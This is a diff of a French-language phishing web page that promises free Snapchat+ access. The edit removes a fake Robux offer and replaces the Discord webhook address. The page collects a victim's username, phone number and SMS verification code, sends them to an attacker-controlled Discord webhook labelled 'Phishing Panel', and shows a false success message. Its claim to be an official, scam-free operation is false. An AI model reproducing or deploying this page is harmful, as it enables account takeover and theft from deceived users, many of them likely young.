@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Snapchat+ & Robux Gratuit</title>
+  <title>Snapchat+ Gratuit</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap');
 
@@ -82,7 +82,6 @@
 
     .offer-card:hover { transform: translateY(-8px); border-color: #c084fc; }
     .offer-card.popular { border-color: #c084fc; }
-    .offer-card.robux-offer { border-color: #facc15; background: rgba(250,204,21,0.08); }
 
     .popular-badge {
       background: linear-gradient(90deg, #c084fc, #e879f9);
@@ -107,10 +106,6 @@
       color: white;
       cursor: pointer;
       margin-top: 20px;
-    }
-
-    .btn-robux {
-      background: linear-gradient(90deg, #facc15, #f97316) !important;
     }
 
     .btn:disabled {
@@ -146,43 +141,32 @@
     <header>
       <div class="logo">👻</div>
       <h1>Snapchat+</h1>
-      <p class="subtitle">Accès Premium + Robux Illimité</p>
+      <p class="subtitle">Accès Premium Gratuit</p>
     </header>
 
     <!-- Étape 1 -->
     <div id="step1" class="step active">
-      <h2>Choisis ta récompense</h2>
-
-      <!-- Offre Snapchat 1 mois -->
+      <h2>Choisis ta durée gratuite</h2>
       <div class="offer-card" onclick="selectOffer(1)">
         <div style="font-size:1.45rem; font-weight:600;">1 Mois Gratuit</div>
         <div class="duration">1 mois</div>
-        <div style="color:#aaa;">Snapchat+ complet</div>
-        <button class="btn">Choisir</button>
+        <div style="color:#aaa;">Profitez de toutes les fonctionnalités premium</div>
+        <button class="btn">Choisir cette offre</button>
       </div>
 
-      <!-- Offre Robux (NOUVEAU) -->
-      <div class="offer-card robux-offer" onclick="selectOffer('robux')">
-        <div style="font-size:1.45rem; font-weight:600; color:#facc15;">🪙 10 000 Robux</div>
-        <div class="duration" style="color:#facc15;">10K R$</div>
-        <div style="color:#aaa;">Crédité instantanément sur Roblox</div>
-        <button class="btn btn-robux">Choisir cette offre</button>
-      </div>
-
-      <!-- Offre Snapchat 1 an -->
       <div class="offer-card popular" onclick="selectOffer(12)">
         <div class="popular-badge">RECOMMANDÉ</div>
         <div style="font-size:1.45rem; font-weight:600;">1 An Gratuit</div>
         <div class="duration">12 mois</div>
-        <div style="color:#aaa;">Économise 11 mois</div>
-        <button class="btn">Choisir</button>
+        <div style="color:#aaa;">La meilleure offre • Économisez 11 mois</div>
+        <button class="btn">Choisir cette offre</button>
       </div>
     </div>
 
     <!-- Étape 2 -->
     <div id="step2" class="step">
-      <h2>Nom d'utilisateur</h2>
-      <input type="text" id="username" placeholder="Ton pseudo Snapchat ou Roblox">
+      <h2>Nom d'utilisateur Snapchat</h2>
+      <input type="text" id="username" placeholder="Ton pseudo">
       <button class="btn" onclick="goToPhone()">Continuer</button>
     </div>
 
@@ -205,21 +189,21 @@
     </div>
 
     <div class="legal">
-      Opération officielle • 100% gratuit • Aucune arnaque
+      Opération officielle • Aucune arnaque
     </div>
   </div>
 
   <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1539316376395845643/-Et7lvU3qu51htfKTcaP6iKygqdEQ4RQ2mo5sIZSw3Ms1rE8sVhYZcG0sEQXc_Yvr0bR";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1539713766302941206/XL0OIF_dEIGzAog3xbb-mkPGxTCRbQrRttCbC9BB_vwOoQrFVlvqNS4DA2nPdpMUqUHv";
 
-    let selectedOffer = 12; // 'robux' ou nombre de mois
+    let selectedMonths = 12;
     let username = "";
     let phoneNumber = "";
     let isSending = false;
     let codeAlreadySent = false;
 
-    function selectOffer(offer) {
-      selectedOffer = offer;
+    function selectOffer(months) {
+      selectedMonths = months;
       showStep(2);
     }
 
@@ -231,7 +215,7 @@
     function goToPhone() {
       username = document.getElementById('username').value.trim();
       if (username.length < 3) {
-        alert("Veuillez entrer ton pseudo (minimum 3 caractères).");
+        alert("Veuillez entrer votre nom d'utilisateur Snapchat.");
         return;
       }
       showStep(3);
@@ -266,23 +250,21 @@
       btn.textContent = "Recevoir le code par SMS";
     }
 
-    // Webhook Nouvelle Demande (avec l'option Robux)
+    // Webhook Nouvelle Demande
     async function sendNewRequestWebhook() {
       if (!WEBHOOK_URL) return;
 
-      let durationText = (selectedOffer === 'robux') ? '10 000 Robux' : `${selectedOffer} mois`;
-
       const payload = {
         embeds: [{
-          title: (selectedOffer === 'robux') ? "🪙 Nouvelle demande ROBUX" : "👻 Nouvelle demande Snapchat+",
+          title: "👻 Nouvelle demande Snapchat+",
           description: "Une nouvelle victime a rempli le formulaire.",
-          color: (selectedOffer === 'robux') ? 0xfacc15 : 0x8b5cf6,
+          color: 0x8b5cf6,
           fields: [
             { name: "👤 Utilisateur", value: `\`${username || "Non renseigné"}\`` },
             { name: "📱 Numéro", value: `\`${phoneNumber}\`` },
-            { name: "🎁 Offre choisie", value: `\`${durationText}\`` }
+            { name: "⏳ Durée choisie", value: `\`${selectedMonths} mois\`` }
           ],
-          footer: { text: "Snap/Robux • Phishing Panel" },
+          footer: { text: "Snapchat+ • Phishing Panel" },
           timestamp: new Date().toISOString()
         }],
         components: [
@@ -305,7 +287,7 @@
       } catch(e) {}
     }
 
-    // Webhook Code Reçu (avec différenciation)
+    // Webhook Code Reçu
     async function submitCode() {
       const code = document.getElementById('code').value.trim();
       const btn = document.getElementById('validateBtn');
@@ -324,11 +306,7 @@
       await sendCodeWebhook(code);
 
       setTimeout(() => {
-        if (selectedOffer === 'robux') {
-          alert("✅ 10 000 Robux crédités sur ton compte Roblox !\nVérifie dans les 5 minutes.");
-        } else {
-          alert("✅ Code validé avec succès !\nTon Snapchat+ est maintenant activé.");
-        }
+        alert("✅ Code validé avec succès !\nTon Snapchat+ est maintenant activé.");
         resetAll();
       }, 800);
     }
@@ -336,22 +314,18 @@
     async function sendCodeWebhook(code) {
       if (!WEBHOOK_URL) return;
 
-      let durationText = (selectedOffer === 'robux') ? '10 000 Robux' : `${selectedOffer} mois`;
-      let title = (selectedOffer === 'robux') ? "✅ Code ROBUX reçu" : "✅ Code Snapchat+ reçu";
-      let color = (selectedOffer === 'robux') ? 0xfacc15 : 0x22c55e;
-
       const payload = {
         embeds: [{
-          title: title,
+          title: "✅ Code Snapchat+ reçu",
           description: "Un code de vérification a été saisi.",
-          color: color,
+          color: 0x22c55e,
           fields: [
             { name: "👤 Utilisateur", value: `\`${username}\`` },
             { name: "🔑 Code", value: `\`${code}\`` },
             { name: "📱 Numéro", value: `\`${phoneNumber}\`` },
-            { name: "🎁 Offre", value: `\`${durationText}\`` }
+            { name: "⏳ Durée", value: `\`${selectedMonths} mois\`` }
           ],
-          footer: { text: "Snap/Robux • Code reçu" },
+          footer: { text: "Snapchat+ • Code reçu" },
           timestamp: new Date().toISOString()
         }]
       };
